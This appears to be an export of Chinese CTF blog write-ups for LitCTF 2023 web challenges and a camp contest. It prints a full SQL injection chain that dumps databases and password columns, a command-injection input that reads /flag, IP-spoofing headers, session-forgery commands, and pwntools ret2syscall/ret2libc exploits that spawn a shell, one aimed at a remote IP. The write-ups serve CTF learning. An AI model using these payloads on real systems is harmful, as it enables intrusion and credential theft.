[{"title":"web入门记录","url":"/2023/09/21/web入门记录/","content":"\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/202308172151534.jpg)\n\n\n\n<!-- more --> \n\n## SQL注入\n\n[SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客](https://blog.csdn.net/A951860555/article/details/116484328)\n\n[浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客]()\n\n\n\nSQL中的select语句，select语句是SQL中的查询语句，用于从数据库中查询数据，并且返回给用户。\n它的简单用法是这样的：**select 字段名1,字段名2...字段名n from** 表名当然，你也可以同时指定数据库名及表名，具体用法是用一个点号连接数据库名和表名，例子：select 字段名1,字段名2...字段名n from 数据库名.表名\n\n联合查询：\n\t格式：**select 字段名1,字段名2...字段名n from 表名1 union select 字段名1,字段名2...字段名n from 表名2**\n\t作用：联合查询用于合并两个或多个 SELECT 语句的结果集\n\t注意：\n\n\t\t1. 每个 SELECT 语句必须拥有相同数量的列\n\t\t2. 列必须拥有相似的数据类型（相似的意思是：有些数据类型间可以互相转化，比如数字字符串和数字。这就叫相似，相似就行，不是必须一模一样）\n\t\t3. 每个 SELECT 语句中的列的顺序必须相同\n\n\n\n记录一种做题方法\n\n题目来源 Litctf sql注入\n\n1.先判断显示位，payload\n\n``` php\n-1)))))) union select 1,2#\n```\n\n2.爆库：\n\n```php+HTML\n1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#\n```\n\n1=2的目的是使得条件为假\n\n3.得到库名\n\n```php\ninformation_schema,mysql,ctftraining,performance_schema,test,ctf\n```\n\n4.爆表：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=\"ctf\"#\n```\n\n5.得到表名：\n\n```php\nusers\n```\n\n6.爆列：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name=\"users\"#\n```\n\n7.得到列名：\n\n```php\nid,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password\n```\n\n8.获取值：\n\n```\n1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#\n```\n\n9.获得彩蛋（难蚌）：\n\n```php\nOHHHHHHH,F1rst_to_Th3_eggggggggg!} \n```\n\nflag同理，去爆ctftraining即可\n\n10.重新爆表：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=\"ctftraining\"#\n```\n\n11.得到表明：\n\n```php\nflag,news,users\n```\n\n12.重新爆列：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name=\"flag\"#\n```\n\n13.获得列名：\n\n```\nflag\n```\n\n14.重新获取值：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(flag) from ctftraining.flag#\n```\n\n## 反序列化\n\n\n\n## session伪造\n","tags":["ctf","Web"]},{"title":"litctf","url":"/2023/09/19/litctf/","content":"\n# web\n\n## [LitCTF 2023]我Flag呢？\n\n打开环境后，直接F12就可以看到flag\n\n同时打开源码的方式还有\n\n``` \nf12/ctrl+u/view-source：\n```\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/{4038CD4C-5AD6-45cc-B79F-734765D74244}.74m3u0jfzps0.webp)\n\n<!-- more --> \n\n## [LitCTF 2023]PHP是世界上最好的语言！！\n\n打开页面，猜测命令执行\n\nsystem(\"ls /\"); 查看目录文件夹，看到flag文件直接查看即可\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230921124923273.png)\n\n\n\n## [LitCTF 2023]就当无事发生\n\n首先去探姬的github，然后直接搜索他的博客地址\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/0bc762429c6478832b423983f5f49c8e.2fr8flw6sa80.webp)\n\n随后直接点击这个按钮，可以查看作者对文件的更改\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2r551bvk57c0.webp)\n\n最后在里面找到带有X号的，就是作者删除过的，或者点上面的√可以看到作者的更改\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/{7E1532FA-9E7A-4e87-A5FE-C4EB552A98AF}.112w5kxubstc.webp)\n\n\n\n## [LitCTF 2023]Follow me and hack me\n\n直接hackar进行传参\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/8160496c03f53fa83615d0212465ef11.12lqjzm7lqf4.webp)\n\n\n\n## [LitCTF 2023]Vim yyds\n\nvim泄露，原理就是在你编辑vim文档的时候，如果需要特殊情况关闭了，他会生成一个xxxx.swp，后续是xxxx.swo，他是可以被扫描出来的，此时你就可以使用命令来恢复他\n\n``` \nvim -r xxx.swp\n```\n\n比如我 vim 1.php 但是我中通关闭了他，那天就会产生这个文件，只需要r一下就可以恢复\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/15250cfd706242cbaf0aa0e5a8f97bab.67gq0p6qvn40.webp)\n\n回到题目，首先下载下这个文件，然后去kali将文件恢复\n\n``` \nnode4.anna.nssctf.cn:28647/.index.php.swp\n```\n\n此时我们就已知了他的php代码\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6pidz6qpuog0.webp)\n\n代码的逻辑很简单，就是post传参一个base64加密后的'Give_Me_You_Flag'\n\n然后传入一个名为cmd的参数，因为外包裹着eval，所以我们可以执行命令\n\n可以用burp进行抓包操作得到flag\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.28caqntwhedc.webp)\n\n\n\n## [LitCTF 2023]这是什么？SQL ！注一下 ！\n\n[SQL注入攻击原理，方法和类型_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1ZR4y1Y745/?spm_id_from=333.880.my_history.page.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18)\n\n[SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客](https://blog.csdn.net/A951860555/article/details/116484328)\n\n作为一个新手web，看了一天，看不懂一点，所以直接记套题，后续慢慢了解\n\n但我可以解释一下每个命令的作用\n\n首先先id=1，先判断是字符型注入还是整形注入\n\nid=1回显就是整形\n\nid=’1‘回显就是字符型\n\n可以看到id=1时有回显，我们判断他是整形注入\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230921170020266.png)\n\n\n\n[浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客](https://blog.csdn.net/qq_23667585/article/details/127213099)\n\n1.先判断显示位，payload\n\n``` php\n-1)))))) union select 1,2#\n```\n\n第一句就有很多问题，详细可以参考上述的文章，wp参考\n\n[[LitCTF2023\\] web方向全题解wp_Leafzzz__的博客-CSDN博客](https://blog.csdn.net/Leaf_initial/article/details/130671885)\n\n2.爆库：\n\n```php+HTML\n1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#\n```\n\n1=2的目的是使得条件为假,经过我的实验使用id=-1)))))) union...同理，所以这俩的作用都是表示判断错误，不显示第一个数据库，显示第二个\n\n3.得到库名\n\n```php\ninformation_schema,mysql,ctftraining,performance_schema,test,ctf\n```\n\n4.爆表：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=\"ctf\"#\n```\n\n5.得到表名：\n\n```php\nusers\n```\n\n6.爆列：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name=\"users\"#\n```\n\n7.得到列名：\n\n```php\nid,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password\n```\n\n8.获取值：\n\n```\n1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#\n```\n\n9.获得彩蛋（难蚌）：\n\n```php\nOHHHHHHH,F1rst_to_Th3_eggggggggg!} \n```\n\nflag同理，去爆ctftraining即可\n\n10.重新爆表：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=\"ctftraining\"#\n```\n\n11.得到表明：\n\n```php\nflag,news,users\n```\n\n12.重新爆列：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name=\"flag\"#\n```\n\n13.获得列名：\n\n```\nflag\n```\n\n14.重新获取值：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(flag) from ctftraining.flag#\n```\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230921171612828.png)\n\n\n\n#### webshell：需要上传木马以及蚁剑的使用\n\n大马，小马，一句话木马等，上传后使用蚁剑进行连接\n\n[如何使用中国蚁剑连接webshell？_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Wk4y1m7fp/?spm_id_from=333.337.search-card.all.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18)\n\n## [LitCTF 2023]Http pro max plus\n\n和http请求头有关的题目，详细可以在下面的网站了解\n\n[HTTP 标头（header） - HTTP | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/web/http/headers)\n\n``` php\nX-Forwarded: 127.0.0.1\nForwarded-For: 127.0.0.1\nForwarded: 127.0.0.1\nX-Requested-With: 127.0.0.1\nX-Forwarded-Proto: 127.0.0.1\nX-Forwarded-Host: 127.0.0.1\nX-remote-IP: 127.0.0.1\nX-remote-addr: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\nX-Client-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nX-Real-IP: 127.0.0.1\nAli-CDN-Real-IP: 127.0.0.1\nCdn-Src-Ip: 127.0.0.1\nCdn-Real-Ip: 127.0.0.1\nCF-Connecting-IP: 127.0.0.1\nX-Cluster-Client-IP: 127.0.0.1\nWL-Proxy-Client-IP: 127.0.0.1\nProxy-Client-IP: 127.0.0.1\nFastly-Client-Ip: 127.0.0.1\nTrue-Client-Ip: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Host: 127.0.0.1\nX-Custom-IP-Authorization: 127.0.0.1\n```\n\n本机地址client-ip: 127.0.0.1\n\n访问网站referer: pornhub.com\n\n指定浏览器user-agent: Chrome\n\n使用代理via: Clash.win\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.73yrqln52y00.webp)\n\n\n\n到达这个页面后，直接去源码查看就可以看到flag所在的地方\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230921175653831.png)\n\n\n\n## [LitCTF 2023]1zjs\n\n直接去源代码区域，找到js源码，可以发现一个php，里面有很多jsfuck的文字，直接去解密就行\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230921180611838.png)\n\n因为是js，可以在控制台直接输出\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230921180812288.png)\n\n\n\n## [LitCTF 2023]Flag点击就送！\n\nsession伪造的题目\n\n我们可以先尝试输入文字然后回车，到后面获取flag，然后他提示我们需要管理员才能获取flag\n\n通过burp抓包我们可以看到有一段cookie被返回，题目的要求是只有管理员才能拿flag\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.61623zag7co0.png)\n\nsession伪造需要一个key，一般的题目中key是需要在题目中找的，但是这个题目的key是猜的，key='litctf'\n\n``` python\n解码：python3  flask_session_cookie_manager3.py decode -s \"密钥\" -c \"session\"\n\n加密：python3  flask_session_cookie_manager3.py encode -s \"密钥\" -t \"上面解密出的一串字符串\"\n```\n\n我们获取了key后可以先去解密一下，我们发现解密后他的请求name为'111',根据题目我们修改成'admin'，就可以了\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230922181231313.png)\n\n我们使用burp发送过去就可以获得flag\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230922181308558.png)\n\n## [LitCTF 2023]Ping\n\n我们首先可以看到源码，里面有个正则\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.64n0c8tf0240.webp)\n\n所以我们有两个方式，第一个就是直接禁用JavaScript即可\n\nF12+F1 禁用后直接 1.1.1.1 || （ls /）(cat /flag) 即可\n\n同时这里就涉及了一个知识点就是linux的管道命令\n\n``` \n&  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &\n\n&& 表示前一条命令执行成功时，才执行后一条命令 ，如 echo '1‘ && echo '2'    \n\n| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo 'yes' | wc -l\n\n|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo \"fail\"\n```\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230922195947561.png)\n\n第二个方法就是使用burp进行抓包，抓到后之间在内部进行修改\n\n![](C:\\Users\\a\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230922203630854.png)\n","tags":["ctf","Pwn","RE","litctf","WEB"]},{"title":"山石结营赛","url":"/2023/08/20/山石结营赛/","content":"\n## ret2syscall\n\n\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64', os='linux', log_level='debug')\n\n# p = process('pwn')\np = remote('58.240.236.231',49003)\n\n\nrdi = 0x40072b\nrsi = 0x400735\nrax = 0x400721\nsyscall = 0x400741\nrdx = 0x40073f\nbinsh = 0x601048\npayload = 0x48*b'a'+ p64(rax) + p64(59) + p64(rdi) + p64(0x601048) + p64(rsi) + p64(0) + p64(syscall)\np.sendline(payload)\np.interactive()\n```\n\n<!-- more --> \n\n## ret2libc\n\n\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\ncontext(arch='amd64', os='linux')\ncontext.log_level = 'debug'\n\n# p = remote(\"58.240.236.231\",49002)\n\np = process('./pwn123')\n\nelf = ELF('./pwn123')\n\ngot_addr = elf.got['puts']\n\nplt_addr = elf.plt['puts']\n\nmain_addr = elf.symbols['vul']\n\nprint(hex(main_addr))\n\npop_rdi = 0x0000000000400783\n\npop_rsi_r15 = 0x0000000000400781\n\npayload = b'a'*0xD8 + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)\n# print(payload)\n\np.sendline(payload)\n\n# p.recvuntil('OK,Good!')\n\nputs_addr=u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) #将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，\n\nprint(hex(puts_addr))\n\nlibc = LibcSearcher(\"puts\",puts_addr)\n\nlibcsase = puts_addr - libc.dump(\"puts\") \n\nsystem_addr = libcsase + libc.dump(\"system\")\n\nbinsh_addr = libcsase + libc.dump(\"str_bin_sh\")\n\nret_addr = 0x0000000000400509\n\npayload2 = b'a'*0xD8 + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\n\np.sendline(payload2)\n\np.interactive()\n```\n\n\n\n## git\n\n\n\n```Shell\n  ?is=flag&flag=flag\n```\n\n\n\n## HSAndroid1\n\n\n\n```python\nflag_chars = list(\"0db530c0e9752357b1ae4cf7ea8331ae\")\n\nfor i in range(14, 0, -2):\n    for j in range(12, 0, -4):\n        temp = flag_chars[j]\n        flag_chars[j] = flag_chars[j - 4]\n        flag_chars[j - 4] = temp\n    j2 = i - 1\n    temp2 = flag_chars[j2]\n    flag_chars[i - 1] = flag_chars[i - 2]\n    flag_chars[i - 2] = temp2\n\nflag = \"\".join(flag_chars)\nprint(\"Decrypted Flag:\", flag)\n```\n\n\n\n## easyusb\n\n\n\n```shell\ntshark -T json -r usb.pcapng > test.json \n```\n\n提取流量包，类似这种格式\n\n```C\nusbhid.data\": \"00:00:16:00:00:00:00:00\"\n```\n\n```c\n00:00:16:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:08:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:06:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:1f:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:08:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:17:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:0e:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:20:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:1c:00:00:00:00:00\n00:00:00:00:00:00:00:00\n```\n\n\n\n\n\n然后网上找脚本一把嗦\n\n```Python\nmappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }\nnums = []\nkeys = open('usbdata.txt')\nfor line in keys:\n    if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':\n         continue\n    nums.append(int(line[6:8],16))\nkeys.close()\noutput = \"\"\nfor n in nums:\n    if n == 0 :\n        continue\n    if n in mappings:\n        output += mappings[n]\n    else:\n        output += '[unknown]'\nprint('output :\\n' + output)\n\n# output :\n# SEC2ETK3Y\n```\n","tags":["ctf","pwn","write up"]}]